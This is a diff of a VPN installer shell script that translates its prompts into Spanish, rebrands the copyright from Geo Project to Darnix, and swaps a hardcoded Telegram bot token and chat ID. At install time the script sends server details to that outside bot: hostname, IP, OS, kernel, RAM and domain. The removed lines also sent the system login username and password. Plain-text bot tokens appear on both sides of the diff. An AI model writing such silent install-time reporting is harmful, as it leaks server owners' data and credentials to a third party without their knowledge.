@@ -300,10 +300,10 @@ function pasang_domain() {
 echo -e ""
 clear
     echo -e "   .----------------------------------."
-echo -e "   |\e[1;32mPlease Select a Domain Type Below \e[0m|"
+echo -e "   |\e[1;32mSeleccione un tipo de dominio a continuación \e[0m|"
 echo -e "   '----------------------------------'"
-echo -e "     \e[1;32m1)\e[0m Enter Your Subdomain"
-echo -e "     \e[1;32m2)\e[0m Use a Random Subdomain"
+echo -e "     \e[1;32m1)\e[0m Ingrese su subdominio"
+echo -e "     \e[1;32m2)\e[0m Use un subdominio Random"
 echo -e "   ------------------------------------"
 read -p "   Please select numbers 1-2 or Any Button(Random) : " host
 echo ""
@@ -340,29 +340,27 @@ function password_default() {
     #echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     #usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID="5366632772"
-    KEY="6359278345:AAEHaXzhZf0KFRBBJeqlcRGYoJFeV1Cbbls"
+    CHATID="6383512264"
+    KEY="6633153384:AAFZu8cehxKiII6BLrTU2jr4KUZAZie6v7M"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
-    TEXT="Installasi VPN Script Stable V3.0
-    ============================
-    <code>Tanggal    :</code> <code>$tanggal</code>
+    TEXT="
+    ◇━━━━━━━━━━━━━━◇
+    SCRIPT PREMIUM V3.0
+    ◇━━━━━━━━━━━━━━◇
+    <code>Fecha  :</code> <code>$tanggal</code>
     <code>Hostname   :</code> <code>${HOSTNAME}</code>
     <code>IP Vps     :</code> <code>$MYIP</code>
-    <code>OS Vps     :</code> <code>$OS_Name</code>
+    <code>S.O Vps     :</code> <code>$OS_Name</code>
     <code>Kernel     :</code> <code>$Kernel</code>
-    <code>Arch       :</code> <code>$Arch</code>
-    <code>Ram Left   :</code> <code>$Ram_Usage MB</code>
-    <code>Ram Used   :</code> <code>$Ram_Total MB</code>
+    <code>Arqui       :</code> <code>$Arch</code>
+    <code>Ram Usado   :</code> <code>$Ram_Usage MB</code>
+    <code>Ram Total   :</code> <code>$Ram_Total MB</code>
+    <code>Dominio :</code> <code>$domain</code>
+    <code>Usuario Script:</code> <code>$username</code>
+    <code>Expira  Script :</code> <code>$exp</code>
     ============================
-    <code>Domain     :</code> <code>$domain</code>
-    <code>IP Vps     :</code> <code>$MYIP</code>
-    <code>User Login :</code> <code>$Username</code>
-    <code>Pass Login :</code> <code>$Password</code>
-    <code>User Script:</code> <code>$username</code>
-    <code>Exp Script :</code> <code>$exp</code>
-    ============================
-    (C) Copyright 2023 By Geo Project
+    (C) Copyright 2023 By Darnix
     ============================
 "
 
